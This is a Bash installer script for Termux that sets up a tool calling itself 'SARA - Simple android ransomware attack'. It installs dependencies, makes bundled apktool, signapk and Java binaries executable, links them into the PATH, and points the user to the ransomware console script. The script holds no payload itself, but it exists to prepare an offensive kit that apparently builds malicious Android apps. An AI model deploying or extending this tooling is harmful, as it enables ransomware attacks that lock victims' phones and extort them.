#!/data/data/com.termux/files/usr/bin/bash

## Colors
c='\033[1;36m'
y='\033[1;33m'
p='\033[1;35m'
RE='\033[0m'
g="\033[1;32m"
r="\033[1;31m"
b="\033[1;34m"
w="\033[0m"
transparent="\e[0m"

DIR=/data/data/com.termux/files/home
null="> /dev/null 2>&1"

function check_root() {
if [ -e .suroot ]; then
	echo -e $G"Success!"$transparent
	sleep 3
else
	echo -e $r"[!]requires root access!!"
 echo -e $r"[!]Use tsu"
	sleep 3
exit
fi
}
clear
cp -R $DIR/SARA $DIR/.suroot/SARA
echo -e $b">"$w" SARA - Simple android ransomware attack"
echo -e $b">"$w" prepare for installing dependencies ..."
sleep 3
echo -e $b">"$w" installing package: "$g"tsu"$w
apt-get install tsu -y
echo -e $b">"$w" installing package: "$g"imagemagick"$w
apt-get install imagemagick -y
echo -e $b">"$w" installing pacakge: "$g"python3"$w
apt-get install python -y
echo -e $b">"$w" installing modules: "$g"pillow"$w
pip3 install Pillow
echo -e $b">"$w" successfully installing dependencies"

echo
echo -e $y" [*] Setting Up Program ..."$c
echo
chmod 777 $DIR/SARA/.data/binaries/lib/libld.so
chmod +x $DIR/SARA/.data/apktool
chmod +x $DIR/SARA/.data/signapk
chmod 777 $DIR/SARA/.data/binaries/java
chmod 777 $DIR/SARA/.data/binaries/bin/java
chmod 777 $DIR/SARA/.data/binaries/bin/keytool

if [ -L $PREFIX/bin/apktool ]; then
rm $PREFIX/bin/apktool
fi

ln -s $DIR/SARA/.data/apktool $PREFIX/bin/
ln -s $DIR/SARA/.data/binaries/java $PREFIX/bin/

echo
echo -e $g" [*] DONE!"
sleep 1
echo -e $b">"$w" use command "$g"python3 tehsara.py"$w" for start the console"
check_root
echo

